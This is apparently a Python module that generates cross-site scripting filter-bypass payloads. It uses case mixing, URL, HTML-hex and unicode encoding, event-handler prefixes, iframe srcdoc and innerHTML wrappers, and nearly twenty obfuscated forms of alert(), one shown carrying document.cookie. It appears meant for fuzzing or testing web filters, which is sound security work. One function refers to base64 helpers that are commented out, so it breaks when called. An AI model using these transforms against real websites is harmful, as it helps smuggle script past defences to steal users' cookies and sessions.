import random
import base64
import codecs


def none(s) -> str:
    return s


# script tag
# event handler
def mix_case(s) -> str:
    # script -> ScRipT
    # onerror -> OneRRor

    mixed = ''
    for char in s:
        if random.random() < 0.5:
            mixed += char.upper()
        else:
            mixed += char.lower()
    return mixed


# script tag
def url_encoding(s) -> str:
    # <script>  -> %3c%73%63%72%69%70%74%3e
    # </script> -> %3c%73%63%72%69%70%74%3e

    result: str = ""

    for ch in s:
        result += '%' + hex(ord(ch))[2:]

    return result


# script tag
# event handler
def insert_string(s) -> str:
    # <script> -> scrscriptipt
    # onerror -> oneonerrorrror

    n = len(s)
    mid = n // 2
    string = s.replace('<', '')
    string = string.replace('>', '')
    string = string.replace('/', '')

    return s[:mid] + string + s[mid:]


# event handler
def add_newline(s) -> str:
    # onerror -> \nonerror

    return '\n' + s


# event handler
def obfuscate_event_handler(s) -> str:
    # onload -> </onload

    symbol = ['/', '</', '^/', '&/', '*/', '%/', '$/', '#/', '@/', '!/', 'fuz/']
    result = random.choice(symbol) + s

    return result


# script tag
# attribute
def html_hex_encode(s) -> str:
    # <script>alert(45)</script> -> &#x3c;script&#x3e;alert(45)&#x3c;/script&#x3e;
    # javascript:alert(45) -> &#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;    &#x34;&#x35;&#x29;

    hex_str = ''

    if s[0] == '<':
        s = s.replace('<', '&#x3c;')
        s = s.replace('>', '&#x3e;')
        hex_str = s
    else:
        for c in s:
            hex_str += '&#x{:02X};'.format(ord(c))

    return hex_str


# script tag
def unicode_encode(s) -> str:
    # <script> -> \u003cscript\u003e

    encoded_str = ''

    s = s.replace('<', '\\u003c')
    s = s.replace('>', '\\u003e')

    encoded_str = s

    return encoded_str


# attribute
def insert_meaningless_char(s) -> str:
    # javascript:alert(1) -> "\1\4jAV\tasC\triPT:alert(1)

    s = s.replace('javascript', '\1\4jAv\tasCr\tipt')
    result = ''

    try:
        result = codecs.decode(s, 'unicode-escape')
    except:
        print(s)

    return result


# def base64_text(s) -> str:
#     # javascript:alert('XSS attack!') -> data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
#
#     index = s.find('alert')
#     message_bytes = s[index:].encode('ascii')
#     base64_bytes = base64.b64encode(message_bytes)
#     base64_message = base64_bytes.decode('ascii')
#
#     result = 'data:text/html;base64,' + base64_message
#
#     return result
#
#
# def base64_image(s) -> str:
#     message_bytes = s[20:].encode('ascii')
#     base64_bytes = base64.b64encode(message_bytes)
#     base64_message = base64_bytes.decode('ascii')
#
#     result = 'data:image/svg+xml;base64,' + base64_message
#
#     return result
#
#
# def base64_application(s) -> str:
#     message_bytes = s[22:].encode('ascii')
#     base64_bytes = base64.b64encode(message_bytes)
#     base64_message = base64_bytes.decode('ascii')
#
#     result = 'data:application/xml;base64,' + base64_message
#
#     return result


# attribute
def obfuscate_javascript(s) -> str:
    # javascript:alert(1) -> &NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)

    s = "&NewLine; 1 &NewLine;; " + s
    s = s.replace("javascript:", "JAVaScrIPt&colon; ")

    return s


# alert() obfuscate
def obfuscate_alert1(s) -> str:
    # alert("XSS") -> this['al' + 'ert']('XSS')

    arg = s[6:-1]
    result = "this['al' + 'ert'](" + arg + ")"

    return result


def obfuscate_alert2(s) -> str:
    # alert(document.cookie) -> Boolean[atob('Y29uc3RydWN0b3I')](atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ'))()

    message_bytes = s.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    result = "Boolean[atob('Y29uc3RydWN0b3I')](atob('" + base64_message + "'))()"

    return result


def obfuscate_alert3(s) -> str:
    # alert('XSS') -> (alert)('XSS')

    s = s.replace('alert', '(alert)')
    return s


def obfuscate_alert4(s) -> str:
    # alert('XSS') -> a=alert,a('XSS')

    arg = s[5:]
    arg = 'a' + arg

    result = 'a=alert,' + arg

    return result


def obfuscate_alert5(s) -> str:
    # alert('XSS') -> ['XSS'].find(alert)

    arg = s[6:-1]
    result = '[' + arg + '].find(alert)'

    return result


def obfuscate_alert6(s) -> str:
    # alert('XSS') -> top["al" + "ert"]('XSS')

    arg = s[5:]
    result = "top['al' + 'ert']" + arg

    return result


def obfuscate_alert7(s) -> str:
    # alert("XSS") -> top[/al/.source+/ert/.source]('XSS')

    arg = s[5:]
    result = 'top[/al/.source+/ert/.source]' + arg

    return result


def obfuscate_alert8(s) -> str:
    # alert("XSS") -> al\u0065rt('XSS')

    arg = s[5:]
    result = 'al\\u0065rt' + arg

    return result


def obfuscate_alert9(s) -> str:
    # alert("XSS") -> top['al\145rt']('XSS')

    arg = s[5:]
    result = "top['al\\145rt']" + arg

    return result


def obfuscate_alert10(s) -> str:
    # alert("XSS") -> top['al\x65rt']('XSS')

    arg = s[5:]
    result = "top['al\\x65rt']" + arg

    return result


def obfuscate_alert11(s) -> str:
    # alert("XSS") -> top[8680439..toString(30)]('XSS')

    arg = s[5:]
    result = 'top[8680439..toString(30)]' + arg

    return result


def obfuscate_alert12(s) -> str:
    # alert("XSS") -> alert?.('XSS')

    arg = s[5:]
    result = 'alert?.' + arg

    return result


def obfuscate_alert13(s) -> str:
    # alert("XSS") -> `${alert`'XSS'`}`

    arg = s[6:-1]

    if arg[0] == '"' or arg[0] == "'":
        arg = arg[1:-1]

    result = '`${alert`' + arg + '`}`'

    return result


def obfuscate_alert14(s) -> str:
    # alert("XSS") -> (alert('XSS'))

    s = '(' + s + ')'

    return s


def obfuscate_alert15(s) -> str:
    # alert("XSS") -> \u{61}lert`XSS`

    arg = s[6:-1]

    if arg[0] == '"' or arg[0] == "'":
        arg = arg[1:-1]

    result = '\\u{61}lert`' + arg + '`'

    return result


def obfuscate_alert16(s) -> str:
    # alert("XSS") -> alert`'XSS'`

    arg = s[6:-1]

    if arg[0] == '"' or arg[0] == "'":
        arg = arg[1:-1]

    result = 'alert`' + arg + '`'

    return result


def obfuscate_alert17(s) -> str:
    # alert('XSS') -> 1> (_=alert,_('XSS'))

    arg = s[6:-1]
    result = '1> (_=alert,_(' + arg + '))'

    return result


def obfuscate_alert18(s) -> str:
    # alert('XSS') -> a\l\ert('XSS')

    arg = s[6:-1]
    result = 'a\l\ert(' + arg + ')'

    return result


def obfuscate_alert19(s) -> str:
    # alert(1) -> location=/javascript:/.source + /alert/.source + [URL+0][0][12] + 1 + [URL+0][0][13]

    result = ""

    arg = s[6:-1]
    result = 'location=/javascript:/.source + /alert/.source + [URL+0][0][12] + ' + arg + ' + [URL+0][0][13]'

    return result


def srcdoc(s) -> str:
    # <img src="valid.jpg" onerror="alert(555)" />
    # <iframe srcdoc='<img src="valid.jpg" onerror="alert(555)" />'>

    result = "<iframe srcdoc='" + s + "'>"

    return result


def innerhtml(s) -> str:
    #  <img src="valid.jpg" onerror="alert(555)" />
    # document.body.innerHTML+="<img src="valid.jpg" onerror="alert(555)" />";

    result = 'document.body.innerHTML+="' + s + '";'

    return result


def get_bypass_alert():
    alerts = [none, obfuscate_alert1, obfuscate_alert2, obfuscate_alert3,
              obfuscate_alert4, obfuscate_alert5, obfuscate_alert6, obfuscate_alert7,
              obfuscate_alert8, obfuscate_alert9, obfuscate_alert10, obfuscate_alert11,
              obfuscate_alert12, obfuscate_alert13, obfuscate_alert14, obfuscate_alert15,
              obfuscate_alert16, obfuscate_alert17, obfuscate_alert18]

    return alerts


def get_bypass_script():
    scripts = [none, mix_case, url_encoding, insert_string, html_hex_encode, unicode_encode]

    return scripts


def get_bypass_event_handler():
    event_handlers = [none, mix_case, insert_string]

    return event_handlers


def get_bypass_javascript():
    javascripts = [none, html_hex_encode, insert_meaningless_char, obfuscate_javascript]

    return javascripts


def get_base64_payload():
    base64_payload = [none, base64_image, base64_application]

    return base64_payload

